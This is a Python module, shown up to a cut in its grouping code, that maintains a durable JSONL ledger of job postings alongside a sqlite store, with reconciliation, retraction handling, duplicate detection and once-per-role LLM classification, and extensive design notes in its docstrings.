"""The role record — lane: roles (ARCHITECTURE.md §7c).

The product is the ROLE, and this module owns it as an entity: is this the same role we saw
yesterday, is it still open, was it re-posted, did two company rows fetch the same posting,
and what do we keep forever. Three seams, called from `pipeline/run.py` in this order:

    ledger = Ledger(st); ledger.open_sync()          # sqlite ∪ ledger, before anything reads
    merged, lines = ledger.resolve_claims(merged)    # one posting under two names -> one
    lines += ledger.record_run(run_date, ...)        # status / episodes / tags; flush

plus `classify_grouped` (one LLM judgment per role, not per board it is listed on).

THE LEDGER. Two text files beside the sqlite store (`cloud_state/` in the cloud, whatever
`--db` names locally — a scratch run never touches the committed files):

    roles.jsonl        one JSON object per role, sorted by role_id, every field except the
                       description text. A daily run changes ~one short line per open role.
    roles_text.jsonl   {role_id, sha1, len, description, updated} — rewritten only when a
                       description changes, so the daily diff stays readable.

sqlite `matched` stays the working index (four other tools read or write it by SQL); the
ledger is the durable, diffable, never-deleting copy. Contract, in the words of §7: the
export is authoritative, sqlite is a per-machine cache. At open the two are reconciled
field by field (`reconcile`) and whatever one side lacks the other supplies. What the
ledger does NOT do: protect against the conflict path in `daily-digest.yml` — both files
ride the same commit and the same wholesale restore as `seen.db` (docs/BACKLOG.md 125).

A corrupt ledger (unparseable, or more than CORRUPT_FRAC of its lines bad) is reported and
NEVER overwritten: sqlite carries the day and the mail says so until a human looks.
"""
from __future__ import annotations

import csv
import datetime as dt
import hashlib
import json
import os
import re
from collections import Counter
from urllib.parse import urlparse

from . import store as _store
from .atomic import _swap

LEDGER = "roles.jsonl"
TEXT = "roles_text.jsonl"
DATASET = "roles.csv"                  # the public one-row-per-role export
DATASET_META = "roles.csv.meta.json"   # what the CSV cannot say about itself
FUNNEL = "funnel.csv"                  # one row per full run: postings -> sent
ARCHIVE = "roles_archive.csv"          # every role that has aged OUT of the window, same columns
RETRACTIONS = "roles_retractions.jsonl"   # hand-written: rows to withdraw, with the reason
# The dataset's rolling window, on `last_seen`. 90 is the OPERATOR'S number (2026-08-30: he
# said "~60" first and "90 days" later; the 60 that shipped that morning was the
# orchestrator's transcription of the first, not a decision). Nothing is evicted by it:
# a role older than the window moves to `roles_archive.csv`, still in the repo.
WINDOW_DAYS = 90
SEP = ";"                              # the ONE list separator in the CSV, documented in meta
RAW_BASE = "https://raw.githubusercontent.com/AnalystJobsIL/pipeline/master/cloud_state/"
DOWNLOAD_URL = RAW_BASE + DATASET      # the raw address, always true; Pages when infra says so
PAGES_URL_ENV = "ROLES_PAGES_URL"      # set by daily-digest.yml when the publish step copies it
ARCHIVE_PAGES_URL_ENV = "ROLES_ARCHIVE_PAGES_URL"   # ditto for roles_archive.csv, once infra copies it
DATASET_SINCE = "2026-08-30"           # the first day roles.csv existed: nothing before it was
                                       # ever public, so a withdrawal earlier than this is a
                                       # withdrawal from nothing
PURGE_REASON = "registry row points at an aggregator, so the postings were never this row's"
PURGE_REASON_AGENCY = ("intake rejected this name as an agency (cloud_state/intake_rejects.json), "
                       "so the posting was another employer's")
PURGE_REASON_RECRUITER = ("pipeline/recruiters.is_recruiter names this as a staffing agency, so "
                          "the posting was another employer's")
TAGS_V = 1                 # bump when roleprofile's vocabulary changes shape -> re-snapshot
CORRUPT_FRAC = 0.10        # more bad lines than this and the file is a wreck, not a ledger
MASS_CLOSE_MIN = 10        # closures/day above max(MIN, FRAC * open) are a broken fetch,
MASS_CLOSE_FRAC = 0.25     # not a measurement: statuses are held and the mail is told
REPOST_DAYS = 3            # the render rule (digest.py): posted_date jumped >=3d past first_seen
# open/closed: the employer's board. superseded: a double (one posting, two names). purged:
# the COMPANY was never an employer (an aggregator row, an agency). withdrawn: the employer
# is real and THIS posting was never in scope — not in Israel, not this employer's — which
# is a different fact from `purged` and must not be filed under it (Comcast is an employer;
# its Houston posting was not ours). Both leave every product, both keep their line.
STATUSES = ("open", "closed", "superseded", "purged", "withdrawn")
RETRACTABLE = ("withdrawn", "purged")      # the two verdicts a retraction line may carry
_ISO = re.compile(r"^\d{4}-\d{2}-\d{2}$")
# path segments that are ATS plumbing, never a tenant slug — and the ATS hosts themselves:
# `Smart Shooter` is not named by every smartrecruiters url, nor `Comeet` by every comeet one
_PLUMBING = {"jobs", "job", "careers", "career", "en", "en-us", "v1", "boards", "posting-api",
             "job-board", "api", "positions", "apply", "view", "search", "www", "com", "co", "io",
             "net", "org", "comeet", "greenhouse", "lever", "ashbyhq", "smartrecruiters",
             "workable", "bamboohr", "breezy", "myworkdayjobs", "recruitee", "teamtailor",
             "pinpointhq", "linkedin", "indeed", "glassdoor", "jobvite", "icims", "eightfold",
             "phenom", "successfactors", "oraclecloud", "metacareers", "postings", "posting",
             "openings", "opportunities", "vacancies", "external", "externaljobs", "jobdetail"}

CORE = ["company", "title", "location", "url", "posted_date", "seniority", "sources",
        "seen_ids", "first_seen", "last_seen", "jd_attempted", "status", "superseded_by"]


# --------------------------------------------------------------------------- #
# files
# --------------------------------------------------------------------------- #
def ledger_paths(db_path):
    d = os.path.dirname(os.path.abspath(db_path))
    return os.path.join(d, LEDGER), os.path.join(d, TEXT)


def retractions_path(db_path):
    """`roles_retractions.jsonl` beside the store — derived like `ledger_paths`, so a scratch
    run applies a scratch file and the committed retractions reach only the committed store."""
    return os.path.join(os.path.dirname(os.path.abspath(db_path)), RETRACTIONS)


class Retractions:
    """The hand-written verdicts: rows that must leave the public dataset, with the reason.

    WHY A FILE, AND WHY BY HAND. Every automatic exclusion this module has (`superseded`,
    `purged`) is a PREDICATE the run re-evaluates each morning. Comcast's Houston posting
    passes every predicate: its registry row is a real employer, its `location` is the
    literal word "Israel" (the scraper stamped the QUERY's location onto a card that had
    none), and `is_israel_job("Israel")` is right to say yes. Nothing the record carries
    says Texas except the url path a human read. A retraction is that human reading,
    written down once, applied by every run after — and lifted by deleting the line.

    One JSON object per line, NO comment lines (`persist_state._well_formed` parses every
    non-blank line of a `.jsonl`, so a `#` line would make the runner check the file out
    from base — put prose in `"evidence"`): `{"url": …} | {"role_id": …}` (at least one; the
    url is the stable key, because a `role_id` is minted from the title and a
    title-cleaning fix upstream would mint a new one), `"status"` in `RETRACTABLE`,
    `"reason"` (free text, published in the meta), `"on"` (ISO date), optional
    `"evidence"`. A bad line is counted and skipped, never raises — a typo in this file
    must cost one retraction, not the digest.

    MATCHING IS EXACT after normalisation (scheme dropped, host lower-cased, one trailing
    slash dropped): a partial key must never withdraw whatever else happens to end with it
    (an attacker's `x/998629` caught two employers), and a key that differs only by
    `http://` must not silently miss. A `role_id` line is BOUND to its record's own url
    at open (`bind`), so the posting stays caught when a title edit mints a new id.
    """

    def __init__(self, entries=(), bad=0, path=""):
        self.entries = list(entries)
        self.bad = bad
        self.path = path
        for e in self.entries:
            e.setdefault("_hits", [])
            e["_urls"] = {_url_key(e["url"])} if e.get("url") else set()

    @classmethod
    def load(cls, path):
        entries, bad = [], 0
        if not os.path.exists(path):
            return cls([], 0, path)
        try:
            with open(path, "rb") as f:
                raw = f.read().decode("utf-8-sig", errors="replace")
        except OSError:
            return cls([], 1, path)
        for line in raw.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                e = json.loads(line)
                ok = (isinstance(e, dict)
                      and (isinstance(e.get("url"), str) and e["url"].strip()
                           or isinstance(e.get("role_id"), str) and e["role_id"])
                      and e.get("status") in RETRACTABLE
                      and isinstance(e.get("reason"), str) and e["reason"].strip()
                      and _iso(str(e.get("on") or "")))
            except ValueError:
                ok = False
            if not ok:
                bad += 1
                continue
            entries.append(e)
        return cls(entries, bad, path)

    def __bool__(self):
        return bool(self.entries)

    def __len__(self):
        return len(self.entries)

    @staticmethod
    def _key(e):
        return e.get("url") or e.get("role_id")

    def bind(self, records):
        """Give every `role_id` line the url of the record it names, so the retraction
        follows the POSTING and not the spelling of its title. Called at open."""
        for e in self.entries:
            rid = e.get("role_id")
            rec = records.get(rid) if rid else None
            if isinstance(rec, dict) and rec.get("url"):
                e["_urls"].add(_url_key(rec["url"]))

    def match_all(self, rec):
        """Every retraction that names this record (a ledger record or a `matched` row):
        by role id, by url, or by any `seen_id` whose id half IS a url."""
        if not self.entries or not isinstance(rec, dict):
            return []
        rid = rec.get("role_id") or rec.get("mkey") or ""
        keys = set()
        if rec.get("url"):
            keys.add(_url_key(rec["url"]))
        sids = rec.get("seen_ids") or []
        if isinstance(sids, str):
            sids = sids.split("+")
        for s in sids:
            if isinstance(s, str) and ":" in s:
                tail = s.split(":", 1)[1]
                if tail.startswith(("http://", "https://")):
                    keys.add(_url_key(tail))
        return [e for e in self.entries
                if (e.get("role_id") and e["role_id"] == rid) or (keys & e["_urls"])]

    def match(self, rec):
        hits = self.match_all(rec)
        return hits[0] if hits else None

    def unmatched(self):
        """Entries no record answered to — a typo, or a posting not (yet) in the store."""
        return [self._key(e) for e in self.entries if not e["_hits"]]


def _http_url(u):
    """The value only if it is an http(s) address; a `0`, a `false` or a stray word from a
    workflow variable must never be published as `download_url`."""
    u = (u or "").strip()
    return u if re.match(r"^https?://\S+$", u) else ""


def _url_key(u):
    """One spelling of an address: no scheme, lower-cased host, no trailing slash."""
    u = (u or "").strip()
    u = re.sub(r"^https?://", "", u, flags=re.I)
    host, sep, rest = u.partition("/")
    return host.lower() + (sep + rest.rstrip("/") if sep else "")


def load(path):
    """({role_id: record}, status, skipped_lines). status: ok | missing | corrupt.
    Tolerates a BOM, CRLF, blank lines and the odd bad line; a duplicate role_id keeps the
    line with the newer `updated` (then the later line)."""
    if not os.path.exists(path):
        return {}, "missing", 0
    try:
        with open(path, "rb") as f:
            raw = f.read().decode("utf-8-sig", errors="replace")
    except OSError:
        return {}, "corrupt", 0
    records, bad, n = {}, 0, 0
    for line in raw.splitlines():
        line = line.strip()
        if not line:
            continue
        n += 1
        try:
            rec = json.loads(line)
            if not _valid(rec):
                raise ValueError("bad shape")
            rid = rec["role_id"]
        except (ValueError, KeyError, TypeError):
            bad += 1
            continue
        prev = records.get(rid)
        if prev is None or str(rec.get("updated") or "") >= str(prev.get("updated") or ""):
            records[rid] = rec
    if n and bad > n * CORRUPT_FRAC:
        return {}, "corrupt", bad
    if n == 0 and raw.strip():
        return {}, "corrupt", 0
    return records, "ok", bad


_STR_FIELDS = [c for c in CORE if c not in ("sources", "seen_ids")] + ["role_id", "closed_on", "emailed_on", "updated", "desc_sha1", "description", "purge_reason", "withdraw_reason", "retracted_on", "purged_on"]
_LIST_FIELDS = ("sources", "seen_ids", "episodes", "reposts")
_DICT_FIELDS = ("sent", "tags", "attribution", "class")


def _valid(rec):
    """A line the rest of this module can touch without raising: every known field has the
    type the code assumes. One hand-repaired typo in the diffable file must freeze the
    ledger, not take the digest (and its Persist step) down."""
    if not isinstance(rec, dict) or not isinstance(rec.get("role_id"), str) or not rec["role_id"]:
        return False
    for k in _STR_FIELDS:
        if k in rec and rec[k] is not None and not isinstance(rec[k], str):
            return False
    for k in _LIST_FIELDS:
        if k in rec and not isinstance(rec[k], list):
            return False
    for k in _DICT_FIELDS:
        if k in rec and rec[k] is not None and not isinstance(rec[k], dict):
            return False
    for k in ("sources", "seen_ids", "reposts"):
        if any(not isinstance(e, str) for e in rec.get(k) or []):
            return False
    if any(not isinstance(e, dict) for e in rec.get("episodes") or []):
        return False
    return True


class LedgerShrink(Exception):
    """A write that would remove records from a ledger file. Never performed."""


def dump(path, records, allow_shrink=False, may_drop=()):
    """Atomic, sorted, one line per role, keys sorted — the diff is the change.

    RETENTION IS THE PRODUCT NOW. Every closed role is history the operator cannot buy
    back: the store began accumulating on 2026-08-16 and a role that leaves it takes its
    posting date, its text and its episodes with it. Nothing in this module deletes — a
    wrong row becomes `superseded` or `purged`, both of which keep the line — so a write
    that holds FEWER records than the file it replaces is a bug somewhere upstream, not a
    deletion anybody asked for. Refuse it and keep the file.

    This is the one choke point: `Ledger.flush` and `stamp_sent` are the only writers and
    both come through here.

    It checks the KEY SET, not the count. A count was the first version and an adversarial
    pass took it apart in two moves: one unreadable line plus one new role that morning nets
    to zero (`load` drops the bad line below `CORRUPT_FRAC` and reports `ok`, the absorption
    hides the shortfall, and the role is gone with only a `skipped 1 unreadable line(s)`
    line that does not name it); and a bare substitution — one role_id out, another in —
    never moves the count at all. Where sqlite still holds the row it comes back as
    `_fresh`, so `episodes`, `sent`, `emailed_on`, `class`, `tags`, `reposts` and the
    ledger-only `status` are gone even though the count says nothing was lost.

    `may_drop` is for the one caller that removes keys on purpose: `flush` prunes
    `roles_text.jsonl` to the records that still exist, and without an exemption a single
    orphaned text key — the `cp -rT` restore pairing an older `roles.jsonl` with a newer
    text file — would refuse EVERY future write of the descriptions file, for ever. That is
    the guard causing a new outage, which is worse than the one it prevents.

    What it does NOT protect against, said plainly: that same wholesale restore path in
    `daily-digest.yml`, which replaces the file without going through this function at all
    (docs/BACKLOG.md 125/160). `allow_shrink=True` exists for a repair tool that rebuilds a
    file from scratch, never for the run.
    """
    if not allow_shrink and os.path.exists(path):
        have, status, _bad = load(path)
        # a corrupt file is not a baseline to measure against — `load` already refuses to
        # let one be read, and its `{}` must not read here as "the file was empty"
        lost = (set(have) - set(records) - set(may_drop)) if status == "ok" else set()
        if lost:
            raise LedgerShrink(
                f"{os.path.basename(path)}: refusing to write {len(records)} records over "
                f"{len(have)} — {len(lost)} would be lost, e.g. "
                f"{', '.join(sorted(lost)[:3])}")

    def _w(f):
        for rid in sorted(records):
            f.write(json.dumps(records[rid], ensure_ascii=False, sort_keys=True) + "\n")
    _swap(path, _w, newline="\n")


def _sha1(text):
    return hashlib.sha1((text or "").encode("utf-8")).hexdigest()


# --------------------------------------------------------------------------- #
# identity
# --------------------------------------------------------------------------- #
_PLACE_WORDS = {"israel", "il", "remote", "hybrid", "office", "site", "on"}


def _titles_agree(a, b):
    """Equal normalized titles, or the longer is the shorter plus words drawn from that
    job's own LOCATION (the scraper glues it on: 'Senior BI Analyst Tel Aviv - Israel').
    'Data Analyst' vs 'Data Analyst, Growth' (or 'Intern') is two roles, never one."""
    ta, tb = _store._norm(a.get("title")), _store._norm(b.get("title"))
    if not ta or not tb:
        # `_norm` keeps Latin + Hebrew only; a CJK/Cyrillic title normalizes to "" (Siemens
        # and Siemens EDA both list '高级精益工程师') — compare the raw text instead
        ra, rb = " ".join(str(a.get("title") or "").split()).casefold(), " ".join(str(b.get("title") or "").split()).casefold()
        return bool(ra) and ra == rb
    if ta == tb:
        return True
    (short, long_, job) = (ta, tb, b) if len(ta) < len(tb) else (tb, ta, a)
    if not long_.startswith(short + " "):
        return False
    rest = long_[len(short):].split()
    allowed = set(_store._norm(job.get("location")).split()) | _PLACE_WORDS
    return all(w in allowed for w in rest)


def _strong_ids(job):
    """seen_ids that identify ONE posting. A scrape row's job_id is sometimes the listing
    page, '#' or a mailto: (scrape_universal.py:485) — every role on that board then shares
    it, so such an id may only corroborate a title match, never stand alone.

    A junk id is not always a symbol. `fetch_workday` reads `bulletFields[0]`, a
    tenant-configured display list, so sixteen of Thales' seventeen Israel postings arrived
    on 2026-08-27 with the id "Regular Employee" — one string naming sixteen different
    roles, which `_titles_agree` was the only thing keeping apart. A value with whitespace
    in it identifies nothing (`store._is_id_shaped`), so it is not strong either. The
    non-`http` test keeps the url fallback (`{platform}:{url}`) strong: an address does
    identify one posting."""
    out = set()
    for sid in (job.get("seen_ids") or [_store.seen_id(job)]):
        plat, _, ident = sid.partition(":")
        if not ident or ident in ("#", "/") or ident.startswith("mailto"):
            continue
        if not ident.lower().startswith("http") and not _store._is_id_shaped(ident):
            continue
        out.add(sid)
    return out


def same_posting(a, b):
    """Two jobs (possibly under different company names) are the same POSTING when their
    titles agree (`_titles_agree`) AND they share a seen_id or a url. Never a url alone
    (Meta's url is the listing page, shared by every Meta role) and never an id alone (a
    listing-page id is shared the same way — six SpearUAV roles carried one)."""
    if not _titles_agree(a, b):
        return False
    if _strong_ids(a) & _strong_ids(b):
        return True
    ua, ub = (a.get("url") or "").strip(), (b.get("url") or "").strip()
    return bool(ua) and ua == ub


_JUNK_TOKENS = {"com", "net", "org", "www", "inc", "ltd", "team", "group", "the", "and"}


def _identity_tokens(company):
    from .firmographics import identity_key
    return [t for t in identity_key(company).split() if len(t) >= 3 and t not in _JUNK_TOKENS]


def _url_segments(url):
    p = urlparse(url or "")
    segs = re.split(r"[^0-9a-z]+", (p.netloc + "/" + p.path).lower())
    return [s for s in segs if s and s not in _PLUMBING]


def names_in_url(company, url):
    """Does the company's own name appear in the url's host or tenant path (armis in
    `armissecurity`, port in `/jobs/port/`)? The one free attribution signal a url carries."""
    segs = _url_segments(url)
    toks = _identity_tokens(company)
    return any(s == t or (len(t) >= 4 and s.startswith(t)) for t in toks for s in segs)


def _source_rank(job):
    """A native ATS row answers for its tenant (real job ids); a scrape of a page is the
    weaker claim; a discovery card is weaker still."""
    srcs = set(job.get("sources") or [job.get("ats_platform") or ""])
    if any(s and s != "scrape" and not s.startswith("discovery") for s in srcs):
        return 0
    return 1 if "scrape" in srcs else 2


def tenant_slug(url):
    segs = _url_segments(url)
    return segs[1] if len(segs) > 1 else (segs[0] if segs else "")


# --------------------------------------------------------------------------- #
# reconcile (pure): one sqlite row vs one ledger record, field by field
# --------------------------------------------------------------------------- #
def _iso(s):
    """Is this a date this module may hand to `dt.date.fromisoformat` without raising?

    The shape test alone said yes to `2026-08-32`, `2026-13-01`, `2026-02-30` and
    `0000-00-00` — and `0000-00-00` is the standard MySQL/ATS null-date sentinel, so it is
    one board away, not a thought experiment. Both upstream normalisers pass such a string
    through untouched (their fallback keeps `s[:10]` whenever `s[4] == "-"`), and
    `_record_run`'s repost check calls `fromisoformat` behind this predicate alone: one bad
    date on one board therefore took `record_run` down, froze the ledger for the day, and
    cost every status, closure and episode of that run. `_valid`'s docstring already
    promises the opposite — "must freeze the ledger, not take the digest down" — but it
    type-checks only, so a date TYPO sailed past it.

    Found by an adversarial pass on 2026-08-30, reproduced end to end, and it predates this
    session's work: the dataset only made it easier to hit."""
    s = str(s or "")
    if not _ISO.match(s):
        return False
    try:
        dt.date.fromisoformat(s)
    except ValueError:
        return False
    return True


def _rowval(row, c):
    """A sqlite value in the ledger's shape (NULL -> "", lists sorted, no empties)."""
    v = row.get(c)
    return sorted(set(v or []) - {""}) if c in ("sources", "seen_ids") else (v or "")


def better_description(a, b):
    """Which of two stored descriptions to keep: a real JD beats one that is not, and only
    between two JDs (or two non-JDs) does length decide.

    "Longer wins" was the whole rule, and it is right between two job descriptions — but
    between page furniture and a job description it is exactly backwards. `jd-text`'s repair on
    2026-08-28 replaced Ballerine's, Ecoppia's and TytoCare's 3,999 characters of Webflow
    navigation and Google Tag Manager with their real (shorter) descriptions, and `reconcile`
    handed the furniture straight back on the next `open_sync`. Cross-lane: `jd-text` changed
    this line, `roles` owns the file.

    It compares — and RETURNS — `jd_body`, the posting with the page chrome cut off its tail,
    and that is load-bearing rather than tidy. On 2026-08-28 (evening) the same trap sprang a
    second time in a new shape: `looks_like_jd` now trims before it judges, so a row holding
    3,546 characters of Melio job description followed by 2,454 characters of LinkedIn sign-in
    form is a job description by that test — and so is the repaired 3,546-character row. Both
    sides being JDs, "longer wins" chose the one with the login form, and `open_sync` wrote it
    back into sqlite: 13 rows, 39,956 characters of furniture, restored minutes after being
    cut out. Returning the body rather than one of the two inputs is what makes the repair
    hold. Cross-lane: `jd-text` changed this line, `roles` owns the file.

    `jdfill` is imported inside the function on purpose — it is the enrich layer and this
    module is read by tools that must not pay for importing it."""
    from .jdfill import jd_body, looks_like_jd
    # Trim only when the trimmed text is STILL a job description. `jd_body` takes the
    # earliest furniture marker, and on a Hebrew LinkedIn page the sign-in block renders
    # BEFORE the posting -- so an unguarded trim here returns "" and `reconcile` writes that
    # empty string into both stores, with none of `_reclean`'s floor or share ceiling in the
    # way (wave 2). This function may prefer a cleaner text; it may not destroy one.
    a, b = (jd_body(a or "") or (a or "")), (jd_body(b or "") or (b or ""))
    ja, jb = looks_like_jd(a), looks_like_jd(b)
    if ja != jb:
        return a if ja else b
    return a if len(a) >= len(b) else b


def reconcile(row, rec):
    """Return the merged CORE fields. Rules, both directions: last_seen max, description
    longer non-empty wins, jd_attempted max, ISO posted_date beats non-ISO (else the newer
    side's), lists union, url/location/seniority from the newer side. `first_seen` is
    sqlite's whenever the row exists: its RESET on a >3-day reappearance is the rule the
    email window re-alerts on, and the ledger keeps the earlier openings in `episodes`
    instead of undoing it. Only a rehydration takes the ledger's."""
    row = dict(row or {})
    rec = rec or {}
    # sqlite knows one status, `superseded`; open/closed live in the ledger alone, so a
    # rehydrated row must never out-vote the ledger's closure
    if row.get("status") != "superseded":
        row["status"], row["superseded_by"] = "", ""
    newer, older = ((row, rec) if str(row.get("last_seen") or "") >= str(rec.get("last_seen") or "")
                    else (rec, row))
    out = {}
    for c in ("company", "title", "url", "location", "seniority", "status", "superseded_by"):
        out[c] = newer.get(c) or older.get(c) or ""
    ls = [x for x in (row.get("last_seen"), rec.get("last_seen")) if x]
    out["first_seen"] = row.get("first_seen") or rec.get("first_seen") or ""
    out["last_seen"] = max(ls) if ls else ""
    pd_new, pd_old = str(newer.get("posted_date") or ""), str(older.get("posted_date") or "")
    out["posted_date"] = pd_new if (_iso(pd_new) or not _iso(pd_old)) else pd_old
    ja = [x for x in (row.get("jd_attempted"), rec.get("jd_attempted")) if x]
    out["jd_attempted"] = max(ja) if ja else ""
    for c in ("sources", "seen_ids"):
        out[c] = sorted({*(row.get(c) or []), *(rec.get(c) or [])} - {""})
    out["description"] = better_description(row.get("description") or "",
                                            rec.get("description") or "")
    if out["status"] not in STATUSES:
        out["status"] = "open"
    return out


# --------------------------------------------------------------------------- #
# classify once per role (docs/BACKLOG.md 124)
# --------------------------------------------------------------------------- #
def classify_grouped(candidates, clf, jdfill, stats, paths):
    """One judgment per ROLE per distinct text. A role listed twice is grouped by
    `merge_key`; every copy that carries its own description is judged (two listings with
    different JDs can be two openings under one title, and HEAD accepted the one that
    qualified), longest text first; a copy with no text of its own never pays a call — it
    inherits the verdict of the first accepted copy and is marked `_inherited`, so
    `merge_duplicates` never lets it be the canonical (its LinkedIn url and date must not
    shape the record). Skipped copies count as `merged-copy` so `sum(paths) ==
    israel_matched` still reconciles. Returns the accepted jobs."""
    groups, order = {}, []
    for j in candidates:
        k = _store.merge_key(j)
        if k not in groups:
            groups[k] = []
            order.append(k)
        groups[k].append(j)
    accepted = []
    for k in order:
        members = sorted(groups[k], key=lambda j: -len(str(j.get("description") or "")))
        best = members[0]
        # the JD is what the LLM tier reads; most list endpoints carry none, so fetch it
        # before judging (budgeted, title-gated) — once per role, on the fullest copy
        if jdfill.maybe_fill(best):
            stats["jd_filled_inline"] += 1
        verdict, seen_texts, judged = None, set(), 0
        for m in members:
            text = str(m.get("description") or "").strip()
            key = _sha1(text) if text else ""
            if judged and (not text or key in seen_texts):
                continue                      # a bare copy, or the same text again: inherits
            seen_texts.add(key)
            c = clf.classify(m)
            paths[c["path"]] += 1
            judged += 1
            m["_class"] = c
            # ...and the seniority the classifier just derived, onto the JOB, because that
            # is what `store.upsert_matched` writes into the `matched.seniority` column and
            # what `reconcile` carries into the record. Every `Classifier.classify` return
            # carries `seniority` (pipeline/seniority.py `base`), and nothing was reading it:
            # the column was empty on 154 of 154 records and 154 of 154 sqlite rows
            # (docs/BACKLOG.md 145). One assignment, no call, no spend.
            m["seniority"] = c.get("seniority") or ""
            if c["decision"] == "accept" and verdict is None:
                verdict = c
        if len(members) > judged:             # never plant a zero key in `Decision paths`
            paths["merged-copy"] += len(members) - judged
        if verdict is None:
            continue
        for m in members:
            if m.get("_class", {}).get("decision") == "accept":
                accepted.append(m)
            elif "_class" not in m:           # inherited: the verdict, and the text it was judged on
                m["_class"] = verdict
                m["seniority"] = verdict.get("seniority") or ""
                m["_inherited"] = True
                if len(str(m.get("description") or "")) < len(str(best.get("description") or "")):
                    m["description"] = best.get("description")
                accepted.append(m)
    return accepted


# --------------------------------------------------------------------------- #
# the ledger
# --------------------------------------------------------------------------- #
class Ledger:
    def __init__(self, st, run_date=None):
        self.st = st
        self.run_date = run_date or dt.date.today().isoformat()
        self.path, self.text_path = ledger_paths(st.path)
        self.text_frozen = False        # only the descriptions file is a wreck
        self.records = {}
        self.text = {}
        self.status = "missing"
        self.frozen = False             # corrupt on disk: read nothing, write nothing
        self.dirty = False
        self.text_dirty = False
        self.report = {}
        self.counts = {}                # this run's status tally, for the funnel record
        self.alarms = []
        self.claims = []                # "Winner<-Loser" strings
        # The hand-written retractions, read OUTSIDE `_guard` and before any seam: `run.py`'s
        # `_alive` consults them directly, so a frozen (corrupt) ledger day cannot put a
        # withdrawn posting back on the board — the file is its own authority.
        self.retractions = Retractions.load(retractions_path(st.path))
        if self.retractions.bad:
            self.alarms.append(f"roles retractions unreadable ({self.retractions.bad} bad "
                               f"line(s) in {RETRACTIONS}) — those lines were not applied")

    def _touch(self, rec):
        """This record changed this run: `updated` gets the run date at flush."""
        rec["_touched"] = True
        self.dirty = True

    def _guard(self, seam, fn, fallback):
        """No ledger seam may take the digest down: an exception becomes an alarm on the
        bold `Stages:` line, the ledger freezes for the day, and the run goes on."""
        try:
            return fn()
        except Exception as e:  # noqa: BLE001
            self.frozen = True
            self.alarms.append(f"roles {seam} failed: {e.__class__.__name__}: {str(e)[:80]} — "
                               f"ledger frozen for the day, sqlite carried it")
            return fallback

    # ---- open --------------------------------------------------------------------
    def open_sync(self):
        """sqlite ∪ ledger → both sides. Returns the report; alarms in self.alarms."""
        return self._guard("open_sync", self._open_sync, {"ledger": "failed"})

    def _open_sync(self):
        rows = {r["mkey"]: r for r in self.st.get_matched_since("0000-01-01", include_superseded=True)}
        self.records, self.status, skipped = load(self.path)
        self.text, tstatus, tskipped = load(self.text_path)
        self.retractions.bind(self.records)      # a role_id line follows its posting's url
        rep = {"ledger": self.status, "skipped": skipped, "rehydrated": 0, "absorbed": 0,
               "merged": 0, "rehydrated_sent": 0, "unrehydratable": 0}
        if self.status == "corrupt":
            self.frozen = True
            self.records, self.text = {}, {}
            self.alarms.append(f"roles ledger corrupt ({LEDGER}, {skipped} bad lines) — not "
                               f"overwritten; sqlite carried the day, nothing recorded")
            rep["sqlite"] = len(rows)
            rep["ledger_n"] = 0
            self.report = rep
            return rep
        if self.status == "missing" and rows:
            self.alarms.append(f"roles ledger missing — {len(rows)} role(s) absorbed from sqlite "
                               f"(first run, or the file was lost); statuses classified, not closed")
        if tstatus == "corrupt":
            # the descriptions file alone: statuses still record; sqlite still has the text
            self.text_frozen = True
            self.text = {}
            self.alarms.append(f"roles ledger corrupt ({TEXT}, {tskipped} bad lines) — not "
                               f"overwritten; descriptions read from sqlite today")
        if skipped:
            self.alarms.append(f"roles ledger skipped {skipped} unreadable line(s)")
        for rid, rec in self.records.items():
            rec.setdefault("description", (self.text.get(rid) or {}).get("description") or "")
            row = rows.get(rid)
            if row is None:
                if not (_iso(rec.get("first_seen")) and _iso(rec.get("last_seen"))):
                    rep["unrehydratable"] += 1      # invisible to every first_seen >= ? read
                    continue
                self.st.insert_matched({**rec, "mkey": rid})
                rep["rehydrated"] += 1
                continue
            merged = reconcile(row, rec)
            changed = {c: merged[c] for c in CORE + ["description"]
                       if merged[c] != _rowval(row, c)}
            # sqlite only ever learns `superseded`; open/closed live in the ledger alone
            if merged["status"] != "superseded":
                changed.pop("status", None)
                changed.pop("superseded_by", None)
            if changed:
                self.st.update_matched(rid, **changed)
                rep["merged"] += 1
            self._absorb(rec, merged)
        for rid, row in rows.items():
            if rid not in self.records:
                rec = {"role_id": rid, "episodes": [], "reposts": [], "sent": {}, "_fresh": True}
                self._absorb(rec, reconcile(row, None))
                self.records[rid] = rec
                rep["absorbed"] += 1
        # `sent` travels in the ledger too: the one rehydration that prevents a re-email
        have = self.st.load_sent()
        missing = {sid: first for rec in self.records.values()
                   for sid, first in (rec.get("sent") or {}).items() if sid not in have}
        if missing:
            rep["rehydrated_sent"] = self.st.upsert_sent_missing(missing)
        if rep["rehydrated"]:
            self.alarms.append(f"roles ledger rehydrated {rep['rehydrated']} role(s) sqlite "
                               f"had lost (+{rep['rehydrated_sent']} sent marks)")
        if rep["unrehydratable"]:
            self.alarms.append(f"roles ledger holds {rep['unrehydratable']} record(s) with no "
                               f"ISO first_seen/last_seen — not rehydrated, fix the line")
        rep["superseded"] = self.sweep_store()
        self._dataset_alarm()
        rep["sqlite"] = len(rows) + rep["rehydrated"]
        rep["ledger_n"] = len(self.records)
        self.report = rep
        if self.dirty or self.text_dirty:
            self.flush()
        return rep

    def _absorb(self, rec, core):
        """Bring a ledger record's core fields up to `core` (a reconciled dict)."""
        desc = core.get("description") or ""
        changed = False
        for c in CORE:
            if rec.get(c) != core[c]:
                rec[c] = core[c]
                changed = True
        sha = _sha1(desc)
        if rec.get("desc_sha1") != sha or rec.get("desc_len") != len(desc):
            rec["desc_sha1"], rec["desc_len"] = sha, len(desc)
            changed = True
        rec["description"] = desc                  # in memory only; stripped at dump
        t = self.text.get(rec["role_id"])
        if desc and (t is None or t.get("sha1") != sha):
            self.text[rec["role_id"]] = {"role_id": rec["role_id"], "sha1": sha,
                                         "len": len(desc), "description": desc,
                                         "updated": rec.get("last_seen") or ""}
            self.text_dirty = True
        if changed:
            self._touch(rec)
        return changed

    # ---- claims: one posting under two company names ----------------------------
    @staticmethod
    def _groups(jobs):
        """Indices of `jobs` grouped by `same_posting` ACROSS companies (union-find over
        shared strong seen_ids and shared urls, every pair in a bucket tested — a same-company
        pair is merge_duplicates' job and never an edge)."""
        n = len(jobs)
        parent = list(range(n))

        def find(i):
            while parent[i] != i:
                parent[i] = parent[parent[i]]
                i = parent[i]
            return i

        buckets = {}
        for i, j in enumerate(jobs):
            for sid in _strong_ids(j):
                buckets.setdefault(("id", sid), []).append(i)
            if (j.get("url") or "").strip():
